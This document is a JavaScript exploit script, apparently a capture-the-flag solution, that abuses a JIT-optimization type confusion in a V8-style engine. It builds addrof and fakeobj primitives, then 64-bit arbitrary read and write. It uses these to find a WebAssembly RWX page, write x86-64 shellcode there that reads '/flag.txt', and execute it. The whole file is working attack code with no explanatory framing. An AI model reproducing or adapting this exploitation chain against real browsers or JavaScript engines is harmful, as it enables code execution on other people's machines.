/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function hex(val) {
  return "0x" + val.toString(16)
}

function float_func_read(a, idx) {
  for (j=0; j<10; j++) {
    j+= 2
  }
  return a[idx]
}

function float_func_write(a, idx, val) {
  for (j=0; j<10; j++) {
    j+= 2
  }
  a[idx] = val
  return
}

float_arr = [1.1, 2.2, 3.3]
obj = {"a": 1.1}
obj_arr = [obj, obj, obj]

// optimize float_func_read
for (i = 0; i<0x10000; i++) {
  float_func_read(float_arr, 0)
}

// optimize float_func_read
for (i = 0; i<0x10000; i++) {
  float_func_write(float_arr, 0, 1.1)
}

// get leaks
var obj_arr_map
var float_arr_map

leak = ftoi(float_func_read(obj_arr, 1))
obj_arr_map = leak >> 32n

float_arr_map = obj_arr_map - 0x50n

console.log("obj_arr_map: " + hex(obj_arr_map))
console.log("float_arr_map: " + hex(float_arr_map))

function addrof(addrof_obj) {
  obj_arr[0] = addrof_obj
  address = ftoi(float_func_read(obj_arr, 0)) & 0xffffffffn
  obj_arr[0] = obj
  return address
}

function fakeobj(addr) {
  float_func_write(obj_arr, 0, itof(addr))
  fake = obj_arr[0]
  obj_arr[0] = obj
  obj_arr[1] = obj
  return fake
}


function arb_read_64(addr) {
  arb_rw_arr = [itof(float_arr_map), itof(0xdeadbeefn), itof(0xdeadbeefn)]
  console.log("arb_rw_arr: "+ hex(addrof(arb_rw_arr)))
  fake = fakeobj(addrof(arb_rw_arr) + 0x44n)
  arb_rw_arr[1] = itof((addr - 0x8n) | (0x6n << 32n))
  return fake[0]
}

function arb_write_64(addr, val) {
  arb_rw_arr = [itof(float_arr_map), itof(0xdeadbeefn), itof(0xdeadbeefn)]
  console.log("arb_rw_arr: "+ hex(addrof(arb_rw_arr)))
  fake = fakeobj(addrof(arb_rw_arr) + 0x44n)
  arb_rw_arr[1] = itof((addr - 0x8n) | (0x6n << 32n))
  fake[0] = itof(val)
}

function copy_shellcode(address, shellcode) {
  arr_buff = new ArrayBuffer(0x100);
  dataview = new DataView(arr_buff)
  arr_buff_addr = addrof(arr_buff)

  console.log("arr_buff: "+hex(arr_buff_addr & 0xffffffffn))
  arb_write_64(arr_buff_addr + 0x14n, address)

  for (i=0; i<shellcode.length; i++) {
    dataview.setFloat64(i*8, shellcode[i], true)
  }
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

rwx_address = ftoi(arb_read_64(addrof(wasm_instance) + 0x68n))
console.log("rwx region: "+hex(rwx_address))
shellcode = [itof(0x48000000303d8d48n),itof(0xc0c748d23148f631n),itof(0x8948050f00000002n),itof(0x00000001c7c748c6n),itof(0x4900000000c2c748n),itof(0xc74800000100c2c7n),itof(0x2e050f00000028c0n),itof(0x78742e67616c662fn),itof(0x0074n),]

console.log("Copying shellcode...")

copy_shellcode(rwx_address, shellcode)

console.log("Executing shellcode...")

f()
